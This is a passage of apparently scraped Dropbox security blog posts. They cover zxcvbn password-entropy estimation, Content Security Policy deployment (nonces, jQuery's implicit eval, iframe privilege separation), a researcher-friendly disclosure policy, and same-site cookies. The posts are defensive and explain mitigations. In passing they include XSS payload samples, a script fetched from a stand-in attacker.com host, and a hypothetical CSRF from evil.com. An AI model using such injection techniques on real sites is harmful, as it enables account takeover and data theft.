- 1, j - 1) * s * Math.pow(d, j)\r\n  entropy = lg possibilities\r\n  # add extra entropy for shifted keys. (% instead of 5, A instead of a.)\r\n  # math is similar to extra entropy from uppercase letters in dictionary\r\n  # matches, see the next snippet below.\r\n  if match.shifted_count\r\n    S = match.shifted_count\r\n    U = match.token.length - match.shifted_count # unshifted count\r\n    possibilities = 0\r\n    possibilities += nCk(S + U, i) for i in [0..Math.min(S, U)]\r\n    entropy += lg possibilities\r\n  entropy On to dictionary entropy: Copy dictionary_entropy = (match) ->\r\n  entropy = lg match.rank\r\n  entropy += extra_uppercasing_entropy match\r\n  entropy += extra_l33t_entropy match\r\n  entropy The first line is the most important: The match has an associated frequency rank, where words like the and good have low rank, and words like photojournalist and maelstrom have high rank. This lets zxcvbn scale the calculation to an appropriate dictionary size on the fly, because if a password contains only common words, a cracker can succeed with a smaller dictionary. This is one reason why xkcd and zxcvbn slightly disagree on entropy for correcthorsebatterystaple (45.2 bits vs 44). The xkcd example used a fixed dictionary size of 2 11 (about 2k words), whereas zxcvbn is adaptive. Adaptive sizing is also the reason zxcvbn.js includes entire dictionaries instead of a space-efficient Bloom filter — rank is needed in addition to a membership test. I'll explain how frequency ranks are derived in the data section at the end. Uppercasing entropy looks like this: Copy extra_uppercase_entropy = (match) ->\r\n  word = match.token\r\n  return 0 if word.match ALL_LOWER\r\n  # a capitalized word is the most common capitalization scheme,\r\n  # so it only doubles the search space (uncapitalized + capitalized):\r\n  # 1 extra bit of entropy.\r\n  # allcaps and end-capitalized are common enough too,\r\n  # underestimate as 1 extra bit to be safe.\r\n  for regex in [START_UPPER, END_UPPER, ALL_UPPER]\r\n    return 1 if word.match regex\r\n  # otherwise calculate the number of ways to capitalize\r\n  # U+L uppercase+lowercase letters with U uppercase letters or less.\r\n  # or, if there's more uppercase than lower (for e.g. PASSwORD), the number\r\n  # of ways to lowercase U+L letters with L lowercase letters or less.\r\n  U = (chr for chr in word.split('') when chr.match /[A-Z]/).length\r\n  L = (chr for chr in word.split('') when chr.match /[a-z]/).length\r\n  possibilities = 0\r\n  possibilities += nCk(U + L, i) for i in [0..Math.min(U, L)]\r\n  lg possibilities So, 1 extra bit for first-letter-uppercase and other common capitalizations. If the uppercasing doesn't fit these common molds, it adds: The math for l33t substitution is similar, but with variables that count substituted and unsubstituted characters instead of uppers and lowers. Pattern matching So far I covered pattern entropy, but not how zxcvbn finds patterns in the first place. Dictionary match is straightforward: check every substring of the password to see if it's in the dictionary: Copy dictionary_match = (password, ranked_dict) ->\r\n  result = []\r\n  len = password.length\r\n  password_lower = password.toLowerCase()\r\n  for i in [0...len]\r\n    for j in [i...len]\r\n      if password_lower[i..j] of ranked_dict\r\n        word = password_lower[i..j]\r\n        rank = ranked_dict[word]\r\n        result.push(\r\n          pattern: 'dictionary'\r\n          i: i\r\n          j: j\r\n          token: password[i..j]\r\n          matched_word: word\r\n          rank: rank\r\n    )\r\n  result ranked_dict maps from a word to its frequency rank. It's like an array of words, ordered by high-frequency-first, but with index and value flipped. l33t substitutions are detected in a separate matcher that uses dictionary_match as a primitive. Spatial patterns like bvcxz are matched with an adjacency graph approach that counts turns and shifts along the way. Dates and years are matched with regexes. Hit matching.coffee on github to read more. Data As mentioned earlier, the 10k password list is from Burnett, released in 2011. Frequency-ranked names and surnames come from the freely available 2000 US Census. To help zxcvbn not crash ie7, I cut off the surname dictionary, which has a long tail, at the 80th percentile (meaning 80% of Americans have one of the surnames in the list). Common first names include the 90th percentile. The 40k frequency list of English words comes from a project on Wiktionary , which counted about 29M words across US television and movies. My hunch is that of all the lists I could find online, television and movie scripts will capture popular usage (and hence likely words used in passwords) better than other sources of English, but this is an untested hypothesis. The list is a bit dated; for example, Frasier is the 824 th most common word. Conclusion At first glance, building a good estimator looks about as hard as building a good cracker. This is true in a tautological sort of way if the goal is accuracy , because \"ideal entropy\" — entropy according to a perfect model — would measure exactly how many guesses a given cracker (with a smart operator behind it) would need to take. The goal isn't accuracy, though. The goal is to give sound password advice. And this actually makes the job a bit easier: I can take the liberty of underestimating entropy, for example, with the only downside of encouraging passwords that are stronger than they need to be, which is frustrating but not dangerous. Good estimation is still difficult, and the main reason is there's so many different patterns a person might use. zxcvbn doesn't catch words without their first letter, words without vowels, misspelled words, n-grams, zipcodes from populous areas, disconnected spatial patterns like qzwxec , and many more. Obscure patterns (like Catalan numbers ) aren't important to catch, but for each common pattern that zxcvbn misses and a cracker might know about, zxcvbn overestimates entropy, and that's the worst kind of bug. Possible improvements: zxcvbn currently only supports English words, with a frequency list skewed toward American usage and spelling. Names and surnames, coming from the US census, are also skewed. Of the many keyboard layouts in the world, zxcvbn recognizes but a few. Better country-specific datasets, with an option to choose which to download, would be a big improvement. As this study by Joseph Bonneau attests, people frequently choose common phrases in addition to common words. zxcvbn would be better if it recognized \"Harry Potter\" as a common phrase, rather than a semi-common name and surname. Google's n-gram corpus fits in a terabyte, and even a good bigram list is impractical to download browser-side, so this functionality would require server-side evaluation and infrastructure cost. Server-side evaluation would also allow a much larger single-word dictionary, such as Google's unigram set. It'd be better if zxcvbn tolerated misspellings of a word up to a certain edit distance. That would bring in many word-based patterns, like skip-the-first-letter. It's hard because word segmentation gets tricky, especially with the added complexity of recognizing l33t substitutions. Even with these shortcomings, I believe zxcvbn succeeds in giving better password advice in a world where bad password decisions are widespread. I hope you find it useful. Please fork on github and have fun! Big thanks to Chris Varenhorst, Gautam Jayaraman, Ben Darnell, Alicia Chen, Todd Eisenberger, Kannan Goundan, Chris Beckmann, Rian Hunter, Brian Smith, Martin Baker, Ivan Kirigin, Julie Tung, Tido the Great, Ramsey Homsany, Bart Volkmer and Sarah Niyogi for helping review this post. // Tags Security Passwords Open Source // Copy link Link copied Link copied", "date": "2012-04-10"},
{"website": "Dropbox", "title": "[CSP] The Unexpected Eval", "author": ["Devdattaakhawe"], "link": "https://dropbox.tech/security/csp-the-unexpected-eval", "abstract": "This is the third of four posts on our experience deploying Content Security Policy at Dropbox. If this sort of work interests you, we are hiring ! We will also be at AppSec USA this week. Come say hi! Previously, we discussed how at Dropbox we have deployed CSP at scale to protect against injection attacks. First, we discussed how we extract signal from violation reports to help create a host whitelist and restrict the sources of code running in our application. We also discussed how nonce sources allow us to mitigate XSS attacks due to content injections. Unfortunately, our CSP policy still has 'unsafe-eval'. This allows the use of string → code constructs like eval, new Function, setTimeout (with a string argument), and thus leaves an XSS risk open. Needless to say, this is not great. Unfortunately, due to wide use of legacy JS templates in our client-side code, it is not easy to disable eval. While we migrate away from these legacy templates to React, we were also wondering what the exact risk from including unsafe-eval in a page's CSP policy is, and how to mitigate it. At first glance, unsafe-eval does not seem like a terribly insecure directive. Unsafe eval only controls whether the browser allows 'eval' (and its variants like new Function); but if an attacker is able to call eval, the attacker has already achieved code execution and we have lost. An exploit would require the attacker to inject into strings that then flow into an eval \"sink.\" This is in contrast to unsafe-inline, which allows an attacker to convert a simple HTML injection vulnerability into a code injection vulnerability. Unfortunately, on further investigation, we realized that this simple reasoning was not true. The main reason for this was our use of libraries such as jQuery and (on legacy pages) Prototype. In fact, the presence of unsafe-eval, while using jQuery or Prototype, negated the advantages of removing 'unsafe-inline' from our policy. Lets dive into more detail for jQuery, but note that similar bugs exist in Prototype and possibly other libraries too. Consider the following two lines of HTML. At a glance, it seems like they will achieve the same result: Copy document.getElementById(\"notify\").innerHTML = untrusted_input\r\njQuery(\"#notify\").html(untrusted_input) With a CSP policy that disallows inline scripts, untrusted_input can have all the onclicks in the world, the browser will not execute them. This is true for both lines of code. But, if untrusted_input contains an inline script tag (e.g., alert(1)), the two lines of code diverge. In the first case, innerHTML does not support inline script tags and the alert will fail to execute. In the second case, jQuery will parse out the script tag, realize that directly setting untrusted_input via innerHTML won’t work. Instead, jQuery will parse out the contents of the script tag and directly eval the code inside the script tag. Worse, if untrusted_input is https://attacker.com/foo.js then jQuery will XHR that foo.js file and eval it (thus, even bypassing the content source restrictions on scripts). The code to do this is in the core domManip function in jQuery. The jQuery code calls this function for nearly all dom manipulation operations (insert, append, html, etc.) Another example of this is the jQuery.ajax function. At a glance, this function looks like a simple function to make XHR requests. Unfortunately, jQuery, by design, provides extra powers to its ajax function. In particular, if the response of an XHR request has the content-type script, jQuery will eval the response ( Github issue ). This means that any place where the attacker is able to control the target URI of an ajax call becomes a code injection vulnerability. In the presence of a CSP policy disallowing eval, the browser would block both these cases. Unfortunately, enabling such a policy was an expensive option for us. Instead, to mitigate this risk, we implemented a \"security patch\" on top of jQuery that blocks these unsafe behaviors. We are now happy to share our jQuery patches for securing against such 'unexpected evals'. We hope that the broader community finds these patches useful. And, if you find other places needing a patch, please share them with us! There are two key components of the patch. First, we remove the implicit eval in ajax with the line below that replaces the default handler for script responses (set here in the jQuery code to an eval) with a no-op: Copy jQuery.ajaxSettings.converters[\"text script\"] = true Second, we override the default domManip with our own implementation that checks the script tag for the presence of the right nonce value before executing it. The patch just reimplements the domManip function (copied verbatim from jQuery) but the key patch is in line 183 of the domManip function: Copy // line 181:\r\n               for (i = 0; i < hasScripts; i++) {\r\n                    node = scripts[i];\r\n                    if ((window.CSP_SCRIPT_NONCE != null) &&\r\n                     (window.CSP_SCRIPT_NONCE !== node.getAttribute('nonce')) {\r\n                          console.error(\"Refused to execute script because CSP_SCRIPT_NONCE\" +\r\n                          \" is defined and the nonce doesn't match.\");\r\n                          continue;\r\n                      } Another option is to just disable this behavior outright by deleting these lines or use something like jPurify that sanitizes all jQuery DOM operations. The important point here, though, is that if you are deploying a CSP policy with ‘unsafe-eval’, it is important to mitigate this risk in some manner to protect against XSS attacks. Supporting trusted eval uses As I mentioned earlier, we cannot remove unsafe-eval from our policy because our legacy code still requires the use of unsafe eval. In particular, we need unsafe-eval because of our use of JavaScript Microtemplates . The template library essentially evals (using new Function) the template (stored in a script tag marked with a content-type of ('text/template'). For example, here’s a template from John’s original blogpost: Copy <script type=\"text/html\" id=\"user_tmpl\">\r\n  <% for ( var i = 0; i < users.length; i++ ) { %>\r\n    <li><a href=\"<%=users[i].url%>\"><%=users[i].name%></a></li>\r\n  <% } %>\r\n</script> The templating code looks up the template using the id parameter and then calls (in essence) new Function on the contents of the script tag above. Unfortunately, this also means that an attacker can exploit an HTML injection vulnerability to insert a malicious template that is eval’ed by our template library. This is not great. To mitigate this risk, we inserted nonce attributes in all template script tags and modified the template library to also check the nonce attribute of template nodes. This is similar to how the browser checks the nonce attribute for script nodes. Copy <script id=test type=text/template nonce=1234>\r\n...// template library only processes this if \r\n...// window.CSP_SCRIPT_NONCE equals 1234\r\n</script>\r\n<script type=text/template>\r\n...//the templating library will ignore this\r\n</script> One issue we hit is that sometimes our client-side code downloads the template after the page load. Since the server-side generates a new nonce each time, the nonce on the template downloaded after page load would be different from the nonce for the main page. To mitigate this issue, we modified our code at the server side. Instead of creating a random nonce on each load, the script nonce for our pages is the hash of the CSRF tokens (note that the CSRF tokens are already random, unguessable values). This reduces the security of the nonce to the security of the CSRF token, but if an attacker knows the CSRF token, they can already take arbitrary actions for the user via CSRF attacks. Finally, this is another reminder that CSP is a mitigation and defense-in-depth feature and is not intended to be the first line of defense. The correct defense for XSS is to construct HTML securely in a framework that automatically escapes untrusted data followed by a good DOM sanitizer as a second layer of defense. Thanks to all the Dropboxers who helped explain the intricacies of the Dropbox website to me. Special thanks to David Goldstein who implemented the fix to jQuery.ajax. Up next, we will talk about issues with CSP and third-party integrations as well as risks associated with them. // Tags Security Content Security Policy // Copy link Link copied Link copied", "date": "2015-09-23"},
{"website": "Dropbox", "title": "[CSP] Unsafe-inline and nonce deployment", "author": ["Devdattaakhawe"], "link": "https://dropbox.tech/security/unsafe-inline-and-nonce-deployment", "abstract": "This is the second of four posts on our experience deploying Content Security Policy at Dropbox. If this sort of work interests you, we are hiring ! We will also be at AppSec USA this week. Come say hi! In the previous post , we discussed how to filter reports and deploy content source whitelists using CSP for the website. Typically, the most important content sources to whitelist are the source of your code, as defined by the script-src (and the object-src directive). A standard content-security-policy deployment will typically include a list of allowed domains like the main website and trusted CDNs in script-src as well as directives like 'unsafe-inline' and 'unsafe-eval'. While this policy prevents arbitrary inclusion of third party scripts, this does not provide protection against XSS attacks due to the presence of the 'unsafe-inline' directive. If you are not familiar with the 'unsafe-inline' and nonce-src directives, please take a look at the CSP primer on html5rocks ; but here’s a quick recap: by default, CSP blocks all inline script blocks ( tags) and inline event handlers (<div onclick=\"somescript\">). This enforces code-data separation: all code running in the page has to come from script files in a whitelist of sources. This significantly reduce XSS risk, but it is difficult without a huge migration effort. As a way to ease migration, the specification accepts a special source syntax for the script-src and style-src directives that allows inline content if it has a matching nonce attribute . Thus, a policy with nonce-randomnumber in the source list for script-src will allow script tags that have \"randomnumber\" as the value of their nonce attribute. The nonce syntax is part of CSP2 and is currently only supported by Chrome and Firefox. On other browsers, using inline script tags requires enabling all inline scripts via 'unsafe-inline'. This post will discuss our experience deploying nonces on the Dropbox website. Before we go into details, let me stress that CSP is only a mitigation and is not a replacement for robust validation and sanitization. At Dropbox our preferred libraries are Pyxl and React at the server and client side respectively, while we use DOMPurify for client-side HTML sanitization. Deploying Script Nonces Deploying script nonces involves two steps: including the right nonce with all inline script tags and removing all inline event handlers. At Dropbox, we use Pyxl for server-side HTML generation. Pyxl converts HTML tags into Python objects and automatically escapes untrusted data during serialization. For inserting script nonces, we modified the Pyxl serialization code to insert the right nonce element into the script tag. The next step, removing inline event handlers, is difficult. For a while now, we have deprecated the use of inline event handlers and new code written at Dropbox does not use them. But this still left us with a big chunk of old code that had not been migrated. To ease the transition, we decided to automatically rewrite inline event handlers to use inline script tags instead. Essentially, the code <div id=\"foo” onload=\"somescript\"> gets converted to: Copy <div id=\"foo\"><!-- if id is absent, we create a unique id -->\r\n  <script> \r\n  // The nonce in the script tag above will be \r\n  // inserted during Pyxl serialization\r\n  function(){\r\n      var e = document.getElementById(foo);\r\n      e.addEventListener(\"load\", function(ev){\r\n  //  ...somescript.. \r\n      });\r\n  }();\r\n  </script> A few things stand out in the example above. First, we use an immediately invoked function expression to not pollute the global namespace with our modifications. Second, we insert a script tag that adds this onload event handlers right after the original tag is opened, instead of after the original div element ends or after the DOMContentLoaded event. While the latter two are probably fine, the behavior above closely matches the browser’s original behavior, and thus, is apt for an automatic transform. If you are wondering: yes, this transformation does not fix existing XSS attacks in the onload code and, thus, isn’t a completely secure transform. However, we deemed this an acceptable risk because systems like Pyxl have gotten reasonably good at identifying and preventing XSS in our server-side code. Further, over time, we plan to deprecate all inline event handlers which should take away this risk. With this change, only inline scripts and event handlers we know about will execute. If an attacker manages to insert an event handler due to, say, a DOMXSS, browsers supporting the nonce attribute will block it. Handling inline script violations reports Like all CSP deployments, the typical way to roll out the new nonce attribute is to roll it out in report-only mode. At Dropbox, we were in report-only mode with the nonce for nearly a month. Similar to violation reports for content sources, it is important to filter out noise even for inline script violations. In addition to the tricks specified in the previous post, Chrome sends two additional fields to help understand an inline script violation: script sample and source file. The former is extremely valuable to quickly grep through the code base, in case reproducing the issue locally is difficult. The latter points to the source JavaScript file that inserted the inline script via DOM APIs. During the filtering phase for inline script violations, we filter out all reports where the source file field is a URI that does not belong to our application (ad injectors and extensions are a common source of violations). Similarly, per Neil’s excellent advice , we also filter out reports with script samples containing code clearly not from our application (e.g., scripts that include the string \"lastPass\"). Firefox had a bug where even if a nonce src allows execution of inline script, Firefox reports a violation, while still executing the code. As a result, to reduce noise, I recommend, for now, deleting the report-uri for Firefox if you are deploying nonce support. Update: This bug was fixed! But, the fix will go live in Firefox 43, scheduled for release in Dec 2015, so I still suggest not sending report-uri for Firefox till late January, 2016. With the proper filtering in place, we deployed our policy with nonce sources and started a process of looking for violations and fixing them. This is a tedious process particularly at our scale and large code base. But, the rewards are worth it and progress is measurable. After a couple of weeks, we reached a place where we were comfortable deploying nonce-src in enforcement mode. Mitigating DOMXSS even without nonce support Unfortunately, nonce sources are a feature of CSP2. While Chrome and Firefox have supported this for a while, Safari and Edge do not. Both browsers ignore the nonce source syntax and enforce the 'unsafe-inline' source expression instead. To further harden our web application, we relied on another trick: Copy document.addEventListener('DOMContentLoaded', function () {\r\n    var metaTag = document.createElement('meta');\r\n    metaTag.setAttribute('http-equiv', 'Content-Security-Policy');\r\n    metaTag.setAttribute('content', \"script-src https: 'unsafe-eval';\");\r\n    document.head.appendChild(metaTag);\r\n}); Just to recap: the DOMContentLoaded event is fired after the browser executes all the HTML and synchronous scripts (including inline scripts). After that, any other JavaScript tasks, events queued up, or other onload handlers fire. Following performance best practices, we already do not execute remote scripts synchronously, so the vast majority of our JavaScript code executes after DOMContentLoaded . The code outlined above inserts a second CSP policy after the DOMContentLoaded event fires. Importantly, the second CSP policy does not include 'unsafe-inline'. Browsers handle multiple CSP policies by enforcing all of them, so only code permitted by all is executed. The net result of this is that Safari and Edge parse and support inline script only in the initial HTML until the DOMContentLoaded event fires. After that, these browsers stop supporting inline event handlers. Imagine that an attacker is able to insert a malicious payload ( <div onclick=alert(1)> ) via, say, innerHTML. In Chrome and Firefox, the presence of nonces in the original policy delivered via a header blocks the inline onclick . In Safari and Edge, while the first policy allows the onclick handler, the second policy, inserted after the DOMContentLoaded event, blocks it. While this is a weaker protection than on browsers supporting nonce sources, it does protect against a large class of DOMXSS attacks. Final Thoughts We have found the techniques outlined above to be an effective mitigation against XSS attacks in our web application. Between Chrome, Firefox, Safari, and Edge, a huge chunk of our users have a strong mitigation in place. While we fix all injection vulnerabilities, it is a welcome relief to know that even successful injection attempts have a second barrier in place for the vast majority of our users. Deploying something as major as CSP, particularly deprecating 'unsafe-inline' requires support from the whole company. Special thanks to all the Dropboxers involved in this project, particularly all the members of the security engineering team. This is the second of a series of blog posts detailing our experience deploying CSP. Up next, we will talk about the impact of including ‘unsafe-eval’ in our policy and how to mitigate the risk. // Tags Security Content Security Policy // Copy link Link copied Link copied", "date": "2015-09-22"},
{"website": "Dropbox", "title": "[CSP] Third Party Integrations and Privilege Separation", "author": ["Devdattaakhawe"], "link": "https://dropbox.tech/security/csp-third-party-integrations-and-privilege-separation", "abstract": "This is the fourth of four posts on our experience deploying Content Security Policy at Dropbox. If this sort of work interests you, we are hiring ! We will also be at AppSec USA this week. Come say hi! In previous blog posts, we discussed our experience deploying CSP at Dropbox, with a particular focus on the script-src directive that allows us to control script sources. With a locked down script-src whitelist, a nonce source, and mitigations to unsafe-eval, our CSP policy provided strong mitigations against XSS via injection attacks in our web application. In supported browsers, the only code allowed to run in our web application would be from our website, CDNs, and trusted third-party integrations. Unfortunately, deploying CSP with third-party integrations has its own risks and challenges. In this post, I will discuss how we handled these challenges using HTML5 privilege separation . Risks with Third Party Integrations For an example of a third-party integration code running on our website, consider the reactive chat widget from SnapEngage running on our business and marketing pages . The recommended mechanism for integrating with SnapEngage with a web application involves inserting the following code snippet into a script node in the HTML page Copy var se = document.createElement('script');\r\nse.type = 'text/javascript';\r\nse.async = true;\r\nse.src = '//storage.googleapis.com/code.snapengage.com/js/' + chatId + '.js';\r\nse.onload = se.onreadystatechange = function() { ... //elided \r\nvar s = document.getElementsByTagName('script')[0]; \r\ns.parentNode.insertBefore(se, s); The above code creates a script node pointing to the SnapEngage library, sets up onload handlers, and inserts the node into the page. The loaded JavaScript library then creates the markup for showing the chat widget, the associated event handlers, and inserts them into the page. There are two key problems with this approach. First, the chat widget markup and event handlers are not aware of CSP policy. So, depending on the widget’s use of eval and inline event handlers, our CSP policy breaks the chat widget. When we first deployed nonces for script-src on the Dropbox website, we had to disable it on pages relying on the widget (thus, increasing the XSS risk on the page). A second, more subtle threat, is that this increases the trusted computing base of the Dropbox website to also include the SnapEngage servers. Recall that the same-origin policy means that all code running on www.dropbox.com origin gets the same privileges. Upcoming improvements to the web platform can mitigate this risk, but these are still under discussion at the W3C. At Dropbox, we have been well aware of this risk and all our integration providers go through thorough reviews and mandatory security requirements. But, compromise of third-party providers is not unheard of and we deemed it an unacceptably high risk for the data that our customers trust us with. One possible solution is to just copy the integration code to our servers and also modify the widget to not use inline event handlers. Unfortunately, this is an expensive and extremely intrusive solution. Worse, it means that any improvement to the widget must involve a manual check and code commit at Dropbox. Note that automating this has many of the same security concerns that we originally had. Privilege Separation to the rescue Given these issues, we instead investigated privilege separation for mitigating the issues posed by such third party integration. The core idea of privilege separation is simple: instead of running third-party code directly in the Dropbox origin, we run it in an unprivileged origin and include it on our website via an iframe. Using postMessages between the iframes, the Dropbox origin provides a smaller, trusted API for ensuring the relevant functionality while not compromising security. This is similar to the privilege separated architecture of OpenSSH and Google Chrome ; the unprivileged child processes correspond to unprivileged origins while the privileged process corresponds to the privileged (Dropbox) origin. Instead of the IPC mechanisms used in binary applications, we use postMessage to communicate between iframes. Concretely, lets do a deeper dive into how the SnapEngage integration looks with a privilege separated design. On loading a page that needs the SnapEngage chat widget, code on https://www.dropbox.com origin creates an iframe pointing to https://www.dbxsnapengage.com. The code on dbxsnapengage.com, in turn, loads the SnapEngage chat widget per the sample code above. The CSS on the iframe hides the border and the iframe’d chat widget looks exactly the same as it would have if included directly. Of course, this is not sufficient. For maintaining the functionality, the chat widget needs to integrate with the main page. For example, we want to show the chat widget only when users click the “chat” button at the top of the page. Previously, the JavaScript code would listen for a click on the chat button and execute startSupportChat function. Copy function startSupportChat() {\r\n    SnapEngage.setWidgetId(SUPPORT_ID);\r\n    SnapEngage.setUserEmail(chatData.Email, true)\r\n    SnapEngage.startChat(\"How can we help you today?\")\r\n} startSupportChat is a function that calls the relevant SnapEngage code that initiates the chat. Now that SnapEngage code is running on dbxsnapengage.com, this function does not do anything (nor does it exist on www.dropbox.com). Instead, we modify the code on www.dropbox.com to send a message to the iframe. Copy DropboxSnapEngage.startSupportChat = function() {\r\n    this.chatRequested = true;\r\n    DropboxSnapEngage.showSnapEngageIframe();\r\n    return DropboxSnapEngage.sendMessage({\r\n        'message_type': 'startSupportChat',\r\n        'chatData': this.chatData\r\n    });\r\n};\r\n \r\nDropboxSnapEngage.sendMessage = function(data) {\r\n    var content_window;\r\n    content_window = DropboxSnapEngage.getSnapEngageIframe().contentWindow;\r\n    return content_window.postMessage(data, this.SNAPENGAGE_IFRAME_ORIGIN);\r\n}; This sends a message to the iframe on dbxsnapengage.com. This page, in turn, defines the following postMessage event handler that calls startSupportChat in turn. Copy function receiveMessage(event) {\r\n     if (!validOriginURL(event.origin)) return;\r\n \r\n     var data = event.data\r\n     switch (data.message_type) {\r\n//elided ...\r\n         case \"startSupportChat\":\r\n             startSupportChat();\r\n             break;\r\n//elided ...\r\n     }\r\n } The end result is that clicking the “Chat” button shows the iframe and sends the chat widget code the appropriate message to start the chat. But, all the chat widget code is now running on the unprivileged dbxsnapengage.com origin. Note that this is just an example: we use privilege separation in multiple places on the Dropbox website to reduce risk from third party integrations (e.g., our integration with our payments provider). Another subtle but important feature of this design is that SnapEngage did not have to make any changes and can continue using even inline event handlers. We own and operate the dbxsnapengage.com domain and also implemented the postMessage API that crosses the privilege boundary. Special thanks to Mark Gilbert and Brad Stronger who took the lead on implementing this integration with SnapEngage. This wraps up our blog post series on CSP . If this sort of work interests you, we are hiring ! Come talk to us at OWASP AppSec USA , if you are around! // Tags Security Content Security Policy // Copy link Link copied Link copied", "date": "2015-09-24"},
{"website": "Dropbox", "title": "Protecting Security Researchers", "author": ["Chris Evans"], "link": "https://dropbox.tech/security/protecting-security-researchers", "abstract": "At Dropbox, we encourage, support, and celebrate independent open security research. One way we do this is via our bug bounty program . We recently tripled our rewards to industry leading values . We also celebrated some of the amazing hacker community results with top-up bonuses, where we retroactively issued additional rewards for particularly unusual, clever, or high-impact findings. This post, however, is not about bug bounty programs. While a well-run bug bounty program is mandatory for maintaining top-tier security posture, this post is about the foundation on which bug bounty programs are built: the Vulnerability Disclosure Policy (VDP). It’s possible to have a great VDP without having a bug bounty program, and organizations should start their security journey there. Unfortunately, open security research, publication, and reporting has faced decades of abuse, threats, and bullying, such as: Legal threats, formal legal suits filed, and inappropriate referral to authorities. Public attacks on character or motivation. Laws that are vague or misguided, and may ban or criminalize good faith security research or publication. Pressuring, gagging, or firing researchers by abusing law or business relationships to the detriment of scientific publication. Anything that stifles open security research is problematic because many of the advances in security that we all enjoy come from the wonderful combined efforts of the security research community. Motivated by recent events and discussions, we’ve realized that too few companies formally commit to avoiding many of the above behaviors. Looking at our own VDP, we realized we could do better, and immediately committed to updating our VDP to be best-of-breed. Our updated VDP contains the following elements: A clear statement that external security research is welcomed. A pledge to not initiate legal action for security research conducted pursuant to the policy, including good faith, accidental violations . A clear statement that we consider actions consistent with the policy as constituting “authorized” conduct under the Computer Fraud and Abuse Act (CFAA). A pledge that we won’t bring a Digital Millennium Copyright Act (DMCA) action against a researcher for research consistent with the policy. A pledge that if a third party initiates legal action, Dropbox will make it clear when a researcher was acting in compliance with the policy (and therefore authorized by us). A specific note that we don’t negotiate bounties under duress. (If you find something, tell us immediately with no conditions attached.) Specific instructions on what a researcher should do if they inadvertently encounter data not belonging to themselves. A request to give us reasonable time to fix an issue before making it public. We do not, and should not, reserve the right to take forever to fix a security issue. And there’s one thing our VDP does not contain: we don’t gate researchers who wish to publish vulnerability details. Using policy or bug bounty payments to muzzle or curate scientific publication would be wrong. We’re also happy to announce that all of the text in our VDP is a freely copyable template. We’ve done this because we’d like to see others take a similar approach. We’ve put some effort in to this across our legal and security teams and if you like what you see, please use it. Similarly, if you have improvements to suggest, we’d love to hear from you . Of course, running a top-notch VDP isn’t just about the formal policy. It’s also about showing respect to researchers. We try and do this in various ways, including via prompt responses, fast payouts, transparency, and open conversations directly with our security engineers. For top bug bounty participants (for Dropbox or just generally), we invite them to visit our offices and give talks, and occasionally set up special internal contracts. We used some great references when refreshing our VDP and we’d like to give them a shout out here: HackerOne’s VDP guidelines and the US DoJ Cyber Security unit’s VDP framework . We also took into consideration recent Senate testimony of experts in vulnerability disclosure in the role hackers can play in strengthening security. In order to do our part to expand protections for researchers more broadly, we’re going to take an unfavorable view of potential suppliers who do not have VDPs protective of researchers, or do not have VDPs at all. A missing or restrictive VDP is often a sign of poor security. Conversely, a VDP welcoming arbitrary research and offering researcher protections is usually a sign of a mature security posture. We value the open security research community and have taken steps to protect researchers. We expect any company which has security as a priority will do the same. We invite the broader industry to join us in these protections and expectations. // Tags Security Vdp Bug Bounty Program // Copy link Link copied Link copied", "date": "2018-03-21"},
{"website": "Dropbox", "title": "Preventing cross-site attacks using same-site cookies", "author": ["Rohan Sharma"], "link": "https://dropbox.tech/security/preventing-cross-site-attacks-using-same-site-cookies", "abstract": "Our comms team told us we need an image; our legal team told us it needed to be freely licensed. Credit: Carsten Schertzer (Creative Commons Attribution 2.0). Dropbox employs traditional cross-site attack defenses, but we also employ same-site cookies as a defense in depth on newer browsers. In this post, we describe how we rolled out same-site cookie based defenses on Dropbox, and offer some guidelines on how you can do the same on your website. Background Recently, the IETF released a new RFC introducing same-site cookies . Unlike traditional cookies, browsers will not send same-site cookies on cross-site requests. At Dropbox, we recently rolled out same-site cookies to defend against CSRF attacks and cross-site information leakage. We concluded that same-site cookies are a convenient way to reduce a website’s attack surface. Cross-site requests Many attacks on the web involve cross-site requests, including the well-known cross-site request forgery (CSRF) attack. These attacks trick the victim’s browser into performing an unintended request to a trusted website. Because users trust Dropbox with their most sensitive data, it's critical that we make our defenses against these attacks as strong as possible. What does a CSRF attack look like? As an example, let’s pretend Dropbox was naively not protecting against CSRF attacks. The attack starts when a victim visits an attacker-controlled website, say www.evil.com . The evil website then returns a page with a malicious payload. The browser executes this malicious payload, which makes a request to https://dropbox.com/cmd/delete and attempts to remove user data. A hypothetical CSRF attack on Dropbox. A classic CSRF defense is to introduce a random value token — called the CSRF token — and store its value in a cookie, say csrf_cookie , on the first page load. The browser sends the CSRF token as a request parameter on every “unsafe” request (POSTs). The server then compares the value of csrf_cookie to the request parameter and throws a CSRF error if these values do not match. Even if a website has CSRF defenses, it could be vulnerable to cross-origin information leakage attacks like cross-site search attacks and JSON hijacking . For example, let’s assume www.dropbox.com has an AJAX route /get_files . A GET request to /get_files gets all of the logged in user’s filenames. and the size of the response can leak side channel information about how many files are there in a user’s Dropbox. We now describe how we designed and implemented defenses against cross-site attacks on Dropbox using same-site cookies. Design For reliability and security, our design for same-site cookie protections should have the following requirements: CSRF defense: the defenses provided should be equivalent to our existing CSRF defense: all POST requests (by default) must be same-site requests, as they are state-changing. GET requests do not require any CSRF protection, but could still be responsible for a different class of cross-site vulnerabilities (see the next requirement). Cross-site information leakage defense: AJAX GET requests should be same-site, as they are a source of many cross-site information leakage vulnerabilities. Availability: Our design should allow for careful rollout and easy rollback. We would still keep our existing CSRF defenses, as same-site cookie protection is still a defense in depth. Further, while rolling out, we should not break existing behavior on valid cross-site GET requests (e.g. a Dropbox link shared via email). Flexibility: Our design should be extensible to allow for cross-site defenses on a variety of request types and routes, not just POST requests and AJAX GET requests. Cookies become same-site by setting the attribute SameSite to one of two values, strict or lax . When strict , browsers will not send the same-site cookie on any cross-site request. When it’s lax , the browser will only prevent sending the cookie on “unsafe” requests (POSTs) but will allow “safe” requests (GETs). Let’s say Dropbox stores two cookies: a session_cookie and a csrf_cookie (we’re simplifying a tad). Further, a POST request to https://dropbox.com/ajax_login on the Dropbox site takes as input the user’s credentials and logs the user in (or equivalently, writes session_cookie ). Dropbox also has many “shared links” on pages with the format https://dropbox.com/sh/…/filename . Users can share these links over email and restrict access to these links. While brainstorming on how to add same-site cookie protections to Dropbox, we came up with the following naïve designs but quickly figured out that they were flawed: Add the SameSite attribute in strict enforcement mode to session_cookie . This makes all requests after logging in same-site and defends against CSRF and cross-information leakage for all authenticated users. Unfortunately, this can be problematic in cases where users navigate to a Dropbox link shared via email. This would cause cross-site GET requests with an authenticated user to not behave as expected, as the browser will not send that cookie. Candidate design #1: Dropbox sets the session 